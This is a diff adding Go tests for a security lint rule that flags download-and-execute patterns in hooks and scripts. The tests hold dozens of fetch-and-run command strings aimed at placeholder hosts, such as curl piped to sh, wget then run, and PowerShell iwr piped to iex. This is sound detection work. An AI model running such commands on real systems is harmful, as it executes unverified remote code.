@@ -188,3 +188,159 @@ func TestCFG014_ProgramFromStdin_StillReported(t *testing.T) {
 		}
 	}
 }
+
+// #1686: a download saved to a file and then run is the two-step form of
+// curl | sh.
+func TestCFG014_DownloadToFileThenRun1686(t *testing.T) {
+	for _, cmd := range []string{
+		`curl -fsSL -o /tmp/i.sh https://x.example/i.sh && bash /tmp/i.sh`,
+		`curl -fsSLo /tmp/i.sh https://x.example/i.sh && sh /tmp/i.sh`,
+		`curl --output=i.sh https://x.example/i.sh; source ./i.sh`,
+		`curl https://x.example/i.sh > i.sh && zsh i.sh`,
+		`wget -O f.sh https://x.example/f.sh ; sh f.sh`,
+		`wget -q --output-document f.py https://x.example/f.py && python3 -u f.py`,
+		`curl -o tool https://x.example/tool && chmod +x tool && ./tool --yes`,
+		`curl -sSL -o "$TMPDIR/setup" https://x.example/setup && chmod 755 "$TMPDIR/setup" && "$TMPDIR/setup"`,
+		`Invoke-WebRequest -OutFile x.ps1 https://x.example/x.ps1; ./x.ps1`,
+		`iwr https://x.example/x.ps1 -OutFile $env:TEMP\x.ps1; & $env:TEMP\x.ps1`,
+		`curl -o i.js https://x.example/i.js && node i.js`,
+		`curl https://x.example/i.sh >i.sh;; bash i.sh;`,
+		`curl --output i.sh https://x.example/i.sh && bash i.sh`,
+		`wget --output-document=f.sh https://x.example/f.sh && sh f.sh`,
+		`Invoke-WebRequest https://x.example/x.ps1 -OutFile:x.ps1; .\x.ps1`,
+		// Printing a hash is not verifying it.
+		`curl -o i.sh https://x.example/i.sh && sha256sum i.sh && bash i.sh`,
+	} {
+		f := CFG014.Check(hookTarget(t, cmd))
+		if len(f) != 1 || f[0].Severity != finding.Error || !strings.Contains(f[0].Message, "saved to a file and then run") {
+			t.Errorf("%s: want 1 download-then-run error, got %+v", cmd, f)
+		}
+	}
+}
+
+func TestCFG014_DownloadToFileNotRun_NoFinding1686(t *testing.T) {
+	for _, cmd := range []string{
+		`curl -o data.json https://x/api && jq . data.json`,
+		`curl -fsSL -o i.sh https://x.example/i.sh && sha256sum -c i.sh.sha256 && bash i.sh`,
+		`curl -fsSL -o i.sh https://x.example/i.sh && shasum -a 256 -c SHA256SUMS && sh i.sh`,
+		`curl -fsSLo /tmp/installer.sh https://example.com/install.sh && echo "abc  /tmp/installer.sh" | sha256sum -c - && bash /tmp/installer.sh`,
+		`curl -fsSL -o i.sh https://x.example/i.sh && curl -fsSL -o i.sh.asc https://x.example/i.sh.asc && gpg --verify i.sh.asc i.sh && bash i.sh`,
+		`curl -o tool.tgz https://x.example/tool.tgz && tar xzf tool.tgz && ./tool`,
+		`curl -o tool https://x.example/tool && ./tool`,
+		`curl -s -o /dev/null https://x.example/health && bash ./scripts/start.sh`,
+		`wget -qO- https://x.example/f.txt && sh f.txt`,
+		`bash setup.sh && curl -o setup.sh https://x.example/setup.sh`,
+		`curl -o a.sh https://x.example/a.sh && bash other.sh`,
+		`curl -o i.sh https://x.example/i.sh && bash -x`,
+		`curl https://x.example/i.sh -o`,
+		`curl -o i.sh https://x.example/i.sh && cosign verify-blob --signature i.sh.sig i.sh && bash i.sh`,
+	} {
+		if f := CFG014.Check(hookTarget(t, cmd)); len(f) != 0 {
+			t.Errorf("%s: expected no finding, got %v", cmd, f)
+		}
+	}
+}
+
+// The run may be the next line of the same script.
+func TestCFG014_DownloadThenRunOnNextScriptLine1686(t *testing.T) {
+	f := CFG014.Check(scriptTarget("#!/bin/sh\ncurl -fsSL -o /tmp/i.sh https://x.example/i.sh\nbash /tmp/i.sh\n"))
+	if len(f) != 1 || !strings.Contains(f[0].Message, "saved to a file and then run") {
+		t.Errorf("want 1 download-then-run finding, got %+v", f)
+	}
+	// The safe alternative in docs/rules/CFG014.md.
+	if f := CFG014.Check(scriptTarget("#!/bin/sh\ncurl -fsSLo /tmp/installer.sh https://example.com/install.sh\necho \"<expected-sha256>  /tmp/installer.sh\" | sha256sum -c -\nbash /tmp/installer.sh\n")); len(f) != 0 {
+		t.Errorf("documented safe alternative: want no finding, got %+v", f)
+	}
+	if f := CFG014.Check(scriptTarget("#!/bin/sh\ncurl -fsSL -o /tmp/i.sh https://x.example/i.sh\nsha256sum -c /tmp/i.sh.sha256\nbash /tmp/i.sh\n")); len(f) != 0 {
+		t.Errorf("verified download: want no finding, got %+v", f)
+	}
+}
+
+// #1676: a download pipeline inside printed text is an install hint that runs nothing.
+func TestCFG014_PrintedInstallHint1676(t *testing.T) {
+	for _, cmd := range []string{
+		`echo "install: curl -fsSL https://sh.rustup.rs | sh"`,
+		`check "Rust" "rustc" "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"`,
+		`echo "apt-get install -y trivy  # or: curl -sfL https://x.example/install.sh | sh"`,
+		`printf '%s\n' 'Run: curl -fsSL https://x.example/i.sh | bash'`,
+		`command -v rustup >/dev/null || echo "missing; run: curl -fsSL https://sh.rustup.rs | sh" >&2`,
+	} {
+		if f := CFG014.Check(hookTarget(t, cmd)); len(f) != 0 {
+			t.Errorf("%s: want no finding, got %+v", cmd, f)
+		}
+	}
+	for _, cmd := range []string{
+		`curl -fsSL https://x.example/i.sh | sh`,
+		`bash -c "curl -fsSL https://x.example/i.sh | sh"`,
+		`sudo sh -c 'curl -fsSL https://x.example/i.sh | bash'`,
+		`eval "curl -fsSL https://x.example/i.sh | sh"`,
+		`ssh deploy@host "curl -fsSL https://x.example/i.sh | sh"`,
+		`echo "curl -fsSL https://x.example/i.sh | sh" | sh`,
+		`echo "$(curl -fsSL https://x.example/i.sh | sh)"`,
+		`echo "installing" && curl -fsSL https://x.example/i.sh | sh`,
+		`powershell -Command "iwr https://x.example/i.ps1 | iex"`,
+	} {
+		f := CFG014.Check(hookTarget(t, cmd))
+		if len(f) != 1 || f[0].Severity != finding.Error {
+			t.Errorf("%s: want 1 error, got %+v", cmd, f)
+		}
+	}
+}
+
+// #1676: backslash escapes inside and outside quotes keep the printed text
+// inert, and an unterminated quote ending in a backslash is handled.
+func TestCFG014_PrintedInstallHintEscapes1676(t *testing.T) {
+	for _, cmd := range []string{
+		`echo \"note\" "run: curl -fsSL https://x.example/i.sh | sh"`,
+		`echo "say \"hi\", then run: curl -fsSL https://x.example/i.sh | sh"`,
+	} {
+		if f := CFG014.Check(hookTarget(t, cmd)); len(f) != 0 {
+			t.Errorf("%s: want no finding, got %+v", cmd, f)
+		}
+	}
+	for _, cmd := range []string{
+		`echo "say \"hi\"" | sh; curl -fsSL https://x.example/i.sh | sh`,
+		`echo \"x\" && curl -fsSL https://x.example/i.sh | sh`,
+	} {
+		f := CFG014.Check(hookTarget(t, cmd))
+		if len(f) != 1 || f[0].Severity != finding.Error {
+			t.Errorf("%s: want 1 error, got %+v", cmd, f)
+		}
+	}
+	// An unterminated quote whose last byte is a backslash: the quoted text is
+	// blanked up to the end and nothing past the input is read.
+	in := `echo "curl -fsSL https://x.example/i.sh | sh \`
+	got := maskPrintedText(in)
+	if len(got) != len(in) || strings.Contains(got, "curl") {
+		t.Errorf("maskPrintedText(%q) = %q", in, got)
+	}
+	if q := outsideQuotes(`a\"b "c\"d" e`); q != `a\"b "    " e` {
+		t.Errorf("outsideQuotes = %q", q)
+	}
+}
+
+// #1676: commands that run a quoted argument (trap, iex, Invoke-Expression,
+// Start-Process, wsl, busybox, systemd-run, unshare, stdbuf, npx, bunx, uvx)
+// keep the download pipeline inside it reported.
+func TestCFG014_PrintedInstallHintRunners1676(t *testing.T) {
+	for _, cmd := range []string{
+		`trap 'curl -fsSL https://x.example/i.sh | sh' EXIT`,
+		`iex "iwr https://x.example/i.ps1 | iex"`,
+		`Invoke-Expression "iwr https://x.example/i.ps1 | iex"`,
+		`Start-Process "iwr https://x.example/i.ps1 | iex"`,
+		`wsl "curl -fsSL https://x.example/i.sh | sh"`,
+		`wsl.exe "curl -fsSL https://x.example/i.sh | sh"`,
+		`busybox "curl -fsSL https://x.example/i.sh | sh"`,
+		`systemd-run "curl -fsSL https://x.example/i.sh | sh"`,
+		`unshare "curl -fsSL https://x.example/i.sh | sh"`,
+		`stdbuf "curl -fsSL https://x.example/i.sh | sh"`,
+		`npx "curl -fsSL https://x.example/i.sh | sh"`,
+		`bunx "curl -fsSL https://x.example/i.sh | sh"`,
+		`uvx "curl -fsSL https://x.example/i.sh | sh"`,
+	} {
+		f := CFG014.Check(hookTarget(t, cmd))
+		if len(f) != 1 || f[0].Severity != finding.Error {
+			t.Errorf("%s: want 1 error, got %+v", cmd, f)
+		}
+	}
+}
